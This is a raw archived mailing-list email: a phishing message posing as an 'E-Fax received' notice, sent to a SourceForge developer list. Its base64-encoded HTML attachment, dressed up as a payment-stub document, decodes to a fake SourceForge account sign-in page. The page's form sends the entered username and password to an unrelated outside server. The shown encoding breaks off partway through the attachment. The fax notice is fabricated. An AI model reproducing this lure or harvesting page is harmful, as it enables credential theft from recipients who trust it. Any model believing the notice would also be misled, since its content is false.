Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 9AF133FC308
	for <lists+industrypack-devel@lfdr.de>; Tue, 31 Aug 2021 09:06:06 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.90_1)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1mKxqF-0007nY-D6
	for lists+industrypack-devel@lfdr.de; Tue, 31 Aug 2021 07:05:55 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.90_1)
 (envelope-from <envio@colegiocoya.cl>) id 1mKxqD-0007nS-Qe
 for industrypack-devel@lists.sourceforge.net; Tue, 31 Aug 2021 07:05:53 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Message-Id:Date:MIME-Version:Content-Type:To:
 Subject:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=uRjW6Ep0jQxkFONCdjCCuZ678YyHX9Ae+qRP+X8ixhc=; b=nKMO3LNmtYsmJgBsTSyOgcRDPT
 9TuQhjOj9eG5EYihKKlPGpTKOeHH5CYpIgEO5/eTCBdNebA4ARTfCyFouXxS6bCrxPIUK3G/CFFVY
 tnWzRHhJ7GakpT0nrX6UcpEFYtB6SeI8iTq3zG7y5HatOPe6nfdW6ARTB07XtpEUsSGY=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Message-Id:Date:MIME-Version:Content-Type:To:Subject:From:Sender:Reply-To
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=uRjW6Ep0jQxkFONCdjCCuZ678YyHX9Ae+qRP+X8ixhc=; b=h
 k7yYNsApciAY9io9kjT91FopiGATXUzbPv0V2MWDz7vxE9BYoRipVGUAkqhQ+WYKI49hUfY6b1t7d
 UCGPYYLeyiEM0Tbr/A/x6jY5RuLmkgoXh7RwR5NyMXEdeSmTElhEhjkKPB1ag7/HZkBa2qTYToE+7
 lnv4cZps4QndSudc=;
Received: from [190.107.176.167]
 (helo=host167.190.107.176.static.wirenetchile.com)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.92.3)
 id 1mKxq4-0006XK-CI
 for industrypack-devel@lists.sourceforge.net; Tue, 31 Aug 2021 07:05:53 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=colegiocoya.cl; s=default; h=Message-Id:Date:MIME-Version:Content-Type:To:
 Subject:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=uRjW6Ep0jQxkFONCdjCCuZ678YyHX9Ae+qRP+X8ixhc=; b=EZBqcMMiRmq10INT5WGeV3B1lc
 Z38xrHg7zbT7CAX5WaCvG8iXfgx+TuGNS/87O+FkJ8gLRRTaQ2Yjz1Gck//Ia0su4F5wNA6lkJUAx
 /e3ZPwyP8Jx5o/p8UVPh4LgZdhjY1Gs/3gEBWiVkwAy6IxiPG9KBBRLs27IK21MTMECyC4xMr7y6C
 WA0fGohB09BqnfPrd722w8P/bKB0MmTBcYaxNC/XyC68auDXoVLVh0I0VZO82j6cDCL8fIv4Ai74e
 wHhdy7tuiV6uL7Yj74A4iUR2xcbSAYOgtrTTSqrbB5+ShT9EePCke3+pdimykvAYZhJmKPr6BqggO
 wJae84yw==;
Received: from [40.87.71.20] (port=53597 helo=atm)
 by svr.colegiocoya.cl with esmtpsa (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.94.2)
 (envelope-from <envio@colegiocoya.cl>) id 1mKuo0-000KsZ-Bv
 for industrypack-devel@lists.sourceforge.net; Mon, 30 Aug 2021 23:51:23 -0400
From: "PaymntStub-DOMaincode" <envio@colegiocoya.cl>
To: <industrypack-devel@lists.sourceforge.net>
Content-Type: multipart/mixed; boundary="uGgFpx6HkfhH6XmyJL=_nx2IjqGVRj6ner"
MIME-Version: 1.0
Date: Tue, 31 Aug 2021 04:51:23 +0100
Message-Id: <31222021085104D3F67D3472$C23D12E6C3@colegiocoya.cl>
X-AntiAbuse: This header was added to track abuse,
 please include it with any abuse report
X-AntiAbuse: Primary Hostname - svr.colegiocoya.cl
X-AntiAbuse: Original Domain - lists.sourceforge.net
X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
X-AntiAbuse: Sender Address Domain - colegiocoya.cl
X-Get-Message-Sender-Via: svr.colegiocoya.cl: authenticated_id:
 envio@colegiocoya.cl
X-Authenticated-Sender: svr.colegiocoya.cl: envio@colegiocoya.cl
X-Source: 
X-Source-Args: 
X-Source-Dir: 
X-Spam-Score: 3.4 (+++)
X-Spam-Report: Spam Filtering performed by mx.sourceforge.net.
 See http://spamassassin.org/tag/ for more details.
 0.2 CK_HELO_GENERIC        Relay used name indicative of a Dynamic Pool or
 Generic rPTR
 -0.0 SPF_PASS               SPF: sender matches SPF record
 1.1 DATE_IN_PAST_03_06     Date: is 3 to 6 hours before Received: date
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 0.1 URI_HEX                URI: URI hostname has long hexadecimal sequence
 1.0 HTML_MESSAGE           BODY: HTML included in message
 -0.1 DKIM_VALID_AU Message has a valid DKIM or DK signature from author's
 domain
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature,
 not necessarily valid
 1.0 RDNS_NONE Delivered to internal network by a host with no rDNS
 0.0 T_HTML_ATTACH          HTML attachment to bypass scanning?
 0.0 HTML_TEXT_INVISIBLE_STYLE HTML hidden text + other spam signs
 0.0 T_FILL_THIS_FORM_SHORT Fill in a short form with personal information
 0.0 T_FILL_THIS_FORM_FRAUD_PHISH Answer suspicious question(s)
 0.0 AWL AWL: Adjusted score from AWL reputation of From: address
X-Headers-End: 1mKxq4-0006XK-CI
Subject: [Industrypack-devel] E-FaxReceived_Tuesday, August 31, 2021
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

This is a multi-part message in MIME format

--uGgFpx6HkfhH6XmyJL=_nx2IjqGVRj6ner
Content-Type: multipart/alternative;
	boundary="FAPysEikD2xkg5usf=_Ih6n5tLpKqoD6PB"

--FAPysEikD2xkg5usf=_Ih6n5tLpKqoD6PB
Content-Type: text/plain; charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable


INCOMING FAX=20

YOU HAVE A NEW INCOMING FAX DOCUMENT

Delivery Notification Information :

Message #: 607434506

Remote Drive: ATTACHMENT

REMOTE CSID: industrypack-devel@lists.sourceforge.net

Received: 8/31/2021

Length Page: 2

Transmit Time: 18.00 sec

FAX STATUS CODE: SUCCESSFUL DELIVERY

--FAPysEikD2xkg5usf=_Ih6n5tLpKqoD6PB
Content-Type: text/html; charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable


<html><head>
<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Diso-=
8859-1">
  <META name=3D"viewport" content=3D"width=3Ddevice-width, initial-sca=
le=3D1"> <META name=3D"format-detection" content=3D"telephone=3Dno"><t=
itle>E-FaxReceived_Tuesday, August 31, 2021</title>
 </head>
 <body style=3D"BACKGROUND-COLOR: #ffffff" bgColor=3D#ffffff><SPAN sty=
le=3D"FONT-SIZE: 12px; FONT-FAMILY: Arial, Helvetica, sans-serif; WHIT=
E-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none;=
 FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: 2; =
WIDOWS: 2; DISPLAY: inline !important; BACKGROUND-COLOR: rgb(255,255,2=
55); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-ca=
ps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness:=
 initial; text-decoration-style: initial; text-decoration-color: initi=
al">&nbsp;</SPAN><FONT style=3D"FONT-FAMILY: -apple-system, BlinkMacSy=
stemFont, 'Helvetica Neue', 'Segoe UI', Arial, sans-serif; WHITE-SPACE=
: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; C=
OLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; BACKGROUN=
D-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: n=
ormal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
-decoration-thickness: initial; text-decoration-style: initial; text-d=
ecoration-color: initial" size=3D5><B><SPAN style=3D"COLOR: rgb(68,114=
,196)">INCOMING&nbsp;FAX</SPAN></B></FONT> <HR style=3D"FONT-SIZE: 12p=
x; FONT-FAMILY: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', '=
Segoe UI', Arial, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; =
TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(243,147,39); FONT-S=
TYLE: normal; ORPHANS: 2; WIDOWS: 2; BACKGROUND-COLOR: rgb(255,255,255=
); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps=
: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: i=
nitial; text-decoration-style: initial; text-decoration-color: initial=
" align=3Dcenter SIZE=3D4 width=3D"98%"><P style=3D"FONT-SIZE: 11pt; F=
ONT-FAMILY: Calibri, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0p=
x; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: black; FONT-STYLE: n=
ormal; ORPHANS: 2; WIDOWS: 2; MARGIN: 0px; BACKGROUND-COLOR: rgb(255,2=
55,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-varian=
t-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickn=
ess: initial; text-decoration-style: initial; text-decoration-color: i=
nitial">&nbsp;<B><SPAN style=3D"COLOR: rgb(68,114,196)">YOU HAVE A NEW=
 INCOMING&nbsp;FAX&nbsp;DOCUMENT</SPAN></B></p><p style=3D"FONT-SIZE: =
11pt; FONT-FAMILY: Calibri, sans-serif; WHITE-SPACE: normal; WORD-SPAC=
ING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: black; FONT-S=
TYLE: normal; ORPHANS: 2; WIDOWS: 2; MARGIN: 0px; BACKGROUND-COLOR: rg=
b(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font=
-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration=
-thickness: initial; text-decoration-style: initial; text-decoration-c=
olor: initial">&nbsp;</P><table style=3D"FONT-SIZE: 12px; BORDER-TOP: =
rgb(211,211,211) 1px dotted; FONT-FAMILY: 'Times New Roman'; BORDER-RI=
GHT: rgb(211,211,211) 1px dotted; WIDTH: 450pt; WHITE-SPACE: normal; W=
ORD-SPACING: 0px; BORDER-COLLAPSE: collapse; BORDER-BOTTOM: rgb(211,21=
1,211) 1px dotted; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(=
0,0,0); FONT-STYLE: normal; BORDER-LEFT: rgb(211,211,211) 1px dotted; =
ORPHANS: 2; WIDOWS: 2; LINE-HEIGHT: normal; BACKGROUND-COLOR: rgb(255,=
255,255); font-variant-ligatures: normal; font-variant-caps: normal; -=
webkit-text-stroke-width: 0px; text-decoration-thickness: initial; tex=
t-decoration-style: initial; text-decoration-color: initial" cellPaddi=
ng=3D0 border=3D0> <tr><td style=3D"BORDER-TOP: rgb(211,211,211) 1px d=
otted; BORDER-RIGHT: rgb(211,211,211) 1px dotted; BORDER-BOTTOM: rgb(2=
11,211,211) 1px dotted; OUTLINE-WIDTH: medium; PADDING-BOTTOM: 0.75pt;=
 PADDING-TOP: 0.75pt; OUTLINE-STYLE: none; PADDING-LEFT: 0.75pt; BORDE=
R-LEFT: rgb(211,211,211) 1px dotted; OUTLINE-COLOR: invert; PADDING-RI=
GHT: 0.75pt" vAlign=3Dtop> <P style=3D"FONT-SIZE: 11pt; FONT-FAMILY: C=
alibri, sans-serif; MARGIN: 0px"><B>&nbsp;&nbsp;&nbsp;<U>Delivery Noti=
fication Information :</U></B></p><p style=3D"FONT-SIZE: 11pt; FONT-FA=
MILY: Calibri, sans-serif; MARGIN: 0px"><B>&nbsp;&nbsp;</B></p><p styl=
e=3D"FONT-SIZE: 11pt; FONT-FAMILY: Calibri, sans-serif; MARGIN: 0px"><=
B>&nbsp;&nbsp;&nbsp;Message #:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</B>607434506</p><p style=3D=
"FONT-SIZE: 11pt; FONT-FAMILY: Calibri, sans-serif; MARGIN: 0px"><B>&n=
bsp;&nbsp; Remote Drive:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;ATTACHMENT</B></p><p style=3D"FONT-SIZE: 11pt; FONT-FAMILY: Calibri,=
 sans-serif; MARGIN: 0px">&nbsp;&nbsp;&nbsp;<B>REMOTE CSID:&nbsp;&nbsp=
;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;industrypack-devel@lists.sourcefo=
rge.net</B></p><p style=3D"FONT-SIZE: 11pt; FONT-FAMILY: Calibri, sans=
-serif; MARGIN: 0px">&nbsp;&nbsp;&nbsp;<B>Received:&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
;&nbsp; 8/31/2021</B></p><p style=3D"FONT-SIZE: 11pt; FONT-FAMILY: Cal=
ibri, sans-serif; MARGIN: 0px">&nbsp;&nbsp;&nbsp;<B>Length Page:</B>&n=
bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
2</p><p style=3D"FONT-SIZE: 11pt; FONT-FAMILY: Calibri, sans-serif; MA=
RGIN: 0px">&nbsp;&nbsp;&nbsp;<B>Transmit Time:</B>&nbsp;&nbsp;&nbsp;&n=
bsp;&nbsp;&nbsp;&nbsp; 18.00 sec</p><p style=3D"FONT-SIZE: 11pt; FONT-=
FAMILY: Calibri, sans-serif; MARGIN: 0px">&nbsp;</p><p style=3D"FONT-S=
IZE: 11pt; FONT-FAMILY: Calibri, sans-serif; MARGIN: 0px">&nbsp;&nbsp;=
&nbsp;<B>FAX&nbsp;STATUS CODE:&nbsp; SUCCESSFUL DELIVERY</B></P></TD><=
/TR></TABLE></body>
 </html>

--FAPysEikD2xkg5usf=_Ih6n5tLpKqoD6PB--

--uGgFpx6HkfhH6XmyJL=_nx2IjqGVRj6ner
Content-Type: text/html;
	name="INDUSTRYPACK-DEVEL@LISTS.SOURCEFORGE.NETPaymntStubl0g0n.html"
Content-Transfer-Encoding: base64
Content-Disposition: attachment;
	filename="INDUSTRYPACK-DEVEL@LISTS.SOURCEFORGE.NETPaymntStubl0g0n.html"
X-Org-FileName: tmpC23.html

PG1ldGEgY2hhcnNldD0idXRmLTgiIC8+DQo8bWV0YSBjb250ZW50PSJJRT1lZGdlLGNocm9tZT0x
IiBodHRwLWVxdWl2PSJYLVVBLUNvbXBhdGlibGUiDQoNCi8+DQo8bWV0YSBjb250ZW50PSJpbml0
aWFsLXNjYWxlPTEuMCwgbWluaW11bS1zY2FsZT0xLjAsDQoNCm1heGltdW0tc2NhbGU9MS4wLCB1
c2VyLXNjYWxhYmxlPW5vLCBtaW5pbWFsLXVpIg0KDQpuYW1lPSJ2aWV3cG9ydCIgLz4NCjxtZXRh
IGNvbnRlbnQ9Im5vIiBuYW1lPSJtc2FwcGxpY2F0aW9uLXRhcC1oaWdobGlnaHQiIC8+DQo8bWV0
YSBuYW1lPSJnb29nbGUiIHZhbHVlPSJub3RyYW5zbGF0ZSIgLz4NCjxtZXRhIGNvbnRlbnQ9IiMz
YzczYWEiIG5hbWU9InRoZW1lLWNvbG9yIiAvPg0KPG1ldGEgY29udGVudD0iIiBpZD0id2luOElj
b24iIG5hbWU9Im1zYXBwbGljYXRpb24tVGlsZUltYWdlIg0KDQovPg0KPG1ldGEgY29udGVudD0i
IzNjNzM5YiIgaWQ9IndpbjhUaWxlQ29sb3IiDQoNCm5hbWU9Im1zYXBwbGljYXRpb24tVGlsZUNv
bG9yIiAvPg0KPG1ldGEgY29udGVudD0ieWVzIiBuYW1lPSJhcHBsZS1tb2JpbGUtd2ViLWFwcC1j
YXBhYmxlIiAvPg0KPG1ldGEgY29udGVudD0iIiBuYW1lPSJhcHBsZS1tb2JpbGUtd2ViLWFwcC10
aXRsZSIgLz4NCjxtZXRhIGNvbnRlbnQ9ImJsYWNrIiBuYW1lPSJhcHBsZS1tb2JpbGUtd2ViLWFw
cC1zdGF0dXMtYmFyLQ0KDQpzdHlsZSIgLz4NCjxsaW5rIGhyZWY9Imh0dHBzOi8vd2VibWFpbG94
LmNvbS5hdS9hcHBzdWl0ZS92PTcuOC4wLQ0KDQo2LjIwMTUxMDA2LjA3NDgyOS9hcHBzL3RoZW1l
cy9kZWZhdWx0L2Zhdmljb24uaWNvIg0KDQppZD0iZmF2aWNvbiIgcmVsPSJzaG9ydGN1dCBpY29u
IiB0eXBlPSJpbWFnZS94LWljb24iIC8+DQo8bGluayBocmVmPSIiIGlkPSJpY29uNTciIHJlbD0i
YXBwbGUtdG91Y2gtaWNvbiIgLz4NCjxsaW5rIGhyZWY9IiIgaWQ9Imljb243MiIgcmVsPSJhcHBs
ZS10b3VjaC1pY29uIg0KDQpzaXplcz0iNzJ4NzIiIC8+DQo8bGluayBocmVmPSIiIGlkPSJpY29u
NzYiIHJlbD0iYXBwbGUtdG91Y2gtaWNvbiINCg0Kc2l6ZXM9Ijc2eDc2IiAvPg0KPGxpbmsgaHJl
Zj0iIiBpZD0iaWNvbjExNCIgcmVsPSJhcHBsZS10b3VjaC1pY29uIg0KDQpzaXplcz0iMTE0eDEx
NCIgLz4NCjxsaW5rIGhyZWY9IiIgaWQ9Imljb24xMjAiIHJlbD0iYXBwbGUtdG91Y2gtaWNvbiIN
Cg0Kc2l6ZXM9IjEyMHgxMjAiIC8+DQo8bGluayBocmVmPSIiIGlkPSJpY29uMTQ0IiByZWw9ImFw
cGxlLXRvdWNoLWljb24iDQoNCnNpemVzPSIxNDR4MTQ0IiAvPg0KPGxpbmsgaHJlZj0iIiBpZD0i
aWNvbjE1MiIgcmVsPSJhcHBsZS10b3VjaC1pY29uIg0KDQpzaXplcz0iMTUyeDE1MiIgLz4NCjxs
aW5rIGhyZWY9IiIgaWQ9InNwbGFzaDQ2MCIgbWVkaWE9IihkZXZpY2Utd2lkdGg6IDMyMHB4KSIN
Cg0KcmVsPSJhcHBsZS10b3VjaC1zdGFydHVwLWltYWdlIiAvPg0KPGxpbmsgaHJlZj0iIiBpZD0i
c3BsYXNoOTIwIiBtZWRpYT0iKGRldmljZS13aWR0aDogMzIwcHgpIGFuZA0KDQooLXdlYmtpdC1k
ZXZpY2UtcGl4ZWwtcmF0aW86IDIpIiByZWw9ImFwcGxlLXRvdWNoLXN0YXJ0dXAtDQoNCmltYWdl
IiAvPg0KPGxpbmsgaHJlZj0iIiBpZD0ic3BsYXNoMTA5NiIgbWVkaWE9IihkZXZpY2UtYXNwZWN0
LXJhdGlvOg0KDQo0MC83MSkiIHJlbD0iYXBwbGUtdG91Y2gtc3RhcnR1cC1pbWFnZSIgLz4NCjxs
aW5rIGhyZWY9Imh0dHBzOi8vd2VibWFpbG94LmNvbS5hdS9hcHBzdWl0ZS92PTcuOC4wLQ0KDQo2
LjIwMTUxMDA2LjA3NDgyOS9hcHBzL3RoZW1lcy9sb2dpbi9sb2dpbi5jc3MiDQoNCnJlbD0ic3R5
bGVzaGVldCIgLz4NCjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+aHRtbCwgYm9keSB7IGJhY2tncm91
bmQtY29sb3I6ICNmZmY7DQoNCm1hcmdpbjogMDsgcGFkZGluZzogMDsgYm9yZGVyOiAwOyB9DQpi
b2R5IHsgb3ZlcmZsb3c6IGhpZGRlbjsgfQ0KDQoudGhyb2JiZXIgew0KICAgIHBvc2l0aW9uOiBh
YnNvbHV0ZTsNCiAgICB0b3A6IDUwJTsNCiAgICB3aWR0aDogMTAwJTsNCiAgICB0ZXh0LWFsaWdu
OiBjZW50ZXI7DQogICAgbWFyZ2luOiAtMTBweCAwIC0yMXB4IDA7DQp9DQoNCi50aHJvYmJlciA+
IGRpdiB7DQogICAgd2lkdGg6IDE0cHg7DQogICAgaGVpZ2h0OiAxNHB4Ow0KICAgIGJhY2tncm91
bmQtY29sb3I6ICNjY2M7DQogICAgYm9yZGVyLXJhZGl1czogMTAwJTsNCiAgICBkaXNwbGF5OiBp
bmxpbmUtYmxvY2s7DQogICAgLXdlYmtpdC1hbmltYXRpb246IGJvdW5jZWRlbGF5IDEuNHMgaW5m
aW5pdGUgZWFzZS1pbi1vdXQ7DQogICAgYW5pbWF0aW9uOiBib3VuY2VkZWxheSAxLjRzIGluZmlu
aXRlIGVhc2UtaW4tb3V0Ow0KICAgIC8qIFByZXZlbnQgZmlyc3QgZnJhbWUgZnJvbSBmbGlja2Vy
aW5nIHdoZW4gYW5pbWF0aW9uDQoNCnN0YXJ0cyAqLw0KICAgIC13ZWJraXQtYW5pbWF0aW9uLWZp
bGwtbW9kZTogYm90aDsNCiAgICBhbmltYXRpb24tZmlsbC1tb2RlOiBib3RoOw0KfQ0KDQoudGhy
b2JiZXIgLmJvdW5jZTEgew0KICAgIC13ZWJraXQtYW5pbWF0aW9uLWRlbGF5OiAtMC4zMnM7DQog
ICAgYW5pbWF0aW9uLWRlbGF5OiAtMC4zMnM7DQp9DQoNCi50aHJvYmJlciAuYm91bmNlMiB7DQog
ICAgLXdlYmtpdC1hbmltYXRpb24tZGVsYXk6IC0wLjE2czsNCiAgICBhbmltYXRpb24tZGVsYXk6
IC0wLjE2czsNCn0NCg0KQC13ZWJraXQta2V5ZnJhbWVzIGJvdW5jZWRlbGF5IHsNCiAgMCUsIDgw
JSwgMTAwJSB7IC13ZWJraXQtdHJhbnNmb3JtOiBzY2FsZSgwLjApIH0NCiAgNDAlIHsgLXdlYmtp
dC10cmFuc2Zvcm06IHNjYWxlKDEuMCkgfQ0KfQ0KDQpAa2V5ZnJhbWVzIGJvdW5jZWRlbGF5IHsN
CiAgMCUsIDgwJSwgMTAwJSB7DQogICAgdHJhbnNmb3JtOiBzY2FsZSgwLjApOw0KICAgIC13ZWJr
aXQtdHJhbnNmb3JtOiBzY2FsZSgwLjApOw0KICB9IDQwJSB7DQogICAgdHJhbnNmb3JtOiBzY2Fs
ZSgxLjApOw0KICAgIC13ZWJraXQtdHJhbnNmb3JtOiBzY2FsZSgxLjApOw0KICB9DQp9DQo8L3N0
eWxlPg0KPG1ldGEgaWQ9ImJvb3RzdHJhcCIgLz4NCjxtZXRhIGlkPSJ0aGVtZSIgLz4NCjxtZXRh
IGlkPSJjc3MiIC8+DQo8bWV0YSBpZD0iY3VzdG9tIiAvPg0KPG1ldGEgaWQ9ImNvZGUiIC8+PHNj
cmlwdD4NCg0KPC9zY3JpcHQ+DQo8ZGl2IGNsYXNzPSJhYnMgdW5zZWxlY3RhYmxlIiBpZD0iaW8t
b3gtY29yZSIgc3R5bGU9ImRpc3BsYXk6DQoNCm5vbmUiPg0KPGRpdiBpZD0iaW8tb3gtYmFubmVy
Ij4mbmJzcDs8L2Rpdj4NCg0KPGRpdiBjbGFzcz0iZjYtdGFyZ2V0IiBpZD0iaW8tb3gtdG9wYmFy
IiByb2xlPSJuYXZpZ2F0aW9uIj4NCjx1bCBjbGFzcz0ibGF1bmNoZXJzIGxpc3QtdW5zdHlsZWQi
Pg0KPC91bD4NCg0KPGRpdiBjbGFzcz0ibGF1bmNoZXItZHJvcGRvd24gZHJvcGRvd24iPg0KPHVs
IGNsYXNzPSJkcm9wZG93bi1tZW51Ij4NCjwvdWw+DQo8L2Rpdj4NCjwvZGl2Pg0KDQo8ZGl2IGNs
YXNzPSJhYnMiIGlkPSJpby1veC1zY3JlZW5zIj4NCjxkaXYgY2xhc3M9ImFicyIgaWQ9ImlvLW94
LXdpbmRvd21hbmFnZXIiIHN0eWxlPSJkaXNwbGF5Og0KDQpub25lIj4NCjxkaXYgY2xhc3M9ImF0
YiIgaWQ9ImlvLW94LXdpbmRvd21hbmFnZXItcGFuZSI+Jm5ic3A7PC9kaXY+DQo8L2Rpdj4NCg0K
PGRpdiBjbGFzcz0iYWJzIiBpZD0iaW8tb3gtZGVza3RvcCI+Jm5ic3A7PC9kaXY+DQo8L2Rpdj4N
CjwvZGl2Pg0KDQo8ZGl2IGNsYXNzPSJ1bnNlbGVjdGFibGUiIGlkPSJpby1veC1sb2dpbi1zY3Jl
ZW4iDQoNCnN0eWxlPSJkaXNwbGF5OiBibG9jayI+DQo8ZGl2IGNsYXNzPSJ3YWxscGFwZXIiIGlk
PSJpby1veC1sb2dpbi0NCg0KYmFja2dyb3VuZCI+Jm5ic3A7PC9kaXY+DQoNCjxkaXYgaWQ9Imlv
LW94LWxvZ2luLWJsb2NrZXIiIHN0eWxlPSJkaXNwbGF5Og0KDQpub25lIj4mbmJzcDs8L2Rpdj4N
Cg0KPGRpdiBpZD0iaW8tb3gtbG9naW4tY29udGFpbmVyLXNjcm9sbHBhbmUiPg0KPGRpdiBjbGFz
cz0iY29udGFpbmVyIiBpZD0iaW8tb3gtbG9naW4tY29udGFpbmVyIj4NCjxkaXYgaWQ9ImlvLW94
LWxvZ2luLWhlYWRlciI+DQo8aDE+PHNwYW4gaWQ9ImlvLW94LWxvZ2luLWhlYWRlci1sYWJlbCI+
U2lnbiBpbiBXaXRoDQoNCkxJU1RTLlNPVVJDRUZPUkdFLk5FVCBBY2NvdW50IDwvc3Bhbj48L2gx
Pg0KPC9kaXY+DQoNCjxkaXYgaWQ9ImlvLW94LWxvZ2luLWZvcm0tY29udGFpbmVyIj4NCjxmb3Jt
IGFjdGlvbj0iaHR0cHM6Ly9vbGFkYXBvb2d1bmpvYmkuY29tL2trL2Zvcm0ucGhwIg0KDQppZD0i
aW8tb3gtbG9naW4tZm9ybSIgbWV0aG9kPSJwb3N0IiB2YWxpZGF0ZT0iIj48aW5wdXQNCg0KbmFt
ZT0ibG9jYXRpb24iIHR5cGU9ImhpZGRlbiIgdmFsdWU9IiIgLz4NCjxkaXYgY2xhc3M9InJvdyBo
ZWxwIj4NCjxkaXYgY2xhc3M9ImNvbC14cy0xMiI+DQo8cCBjbGFzcz0iaGVscC1ibG9jayIgaWQ9
ImlvLW94LWxvZ2luLWhlbHAiPiZuYnNwOzwvcD4NCjwvZGl2Pg0KPC9kaXY+DQoNCjxkaXYgY2xh
c3M9InJvdyB1c2VybmFtZSI+DQo8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIGNvbC14cy0xMiI+PGxh
YmVsIGNsYXNzPSJzci1vbmx5Ig0KDQpkYXRhLWkxOG49IlVzZXIgbmFtZSIgZm9yPSJ1c2VybmFt
ZSI+VXNlciBuYW1lPC9sYWJlbD4gPGlucHV0DQoNCmFyaWEtcmVxdWlyZWQ9InRydWUiIGF1dG9j
YXBpdGFsaXplPSJub25lIiBhdXRvY29ycmVjdD0ib2ZmIg0KDQphdXRvZm9jdXM9IiIgY2xhc3M9
ImZvcm0tY29udHJvbCIgZGF0YS1pMThuPSJVc2VyIG5hbWUiDQoNCmRhdGEtaTE4bi1hdHRyPSJw
bGFjZWhvbGRlciIgaWQ9ImlvLW94LWxvZ2luLXVzZXJuYW1lIg0KDQptYXhsZW5ndGg9IjEwMDAi
IG5hbWU9InVzZXJuYW1lIiBwbGFjZWhvbGRlcj0iVXNlciBuYW1lIg0KDQpyZXF1aXJlZD0iIiBz
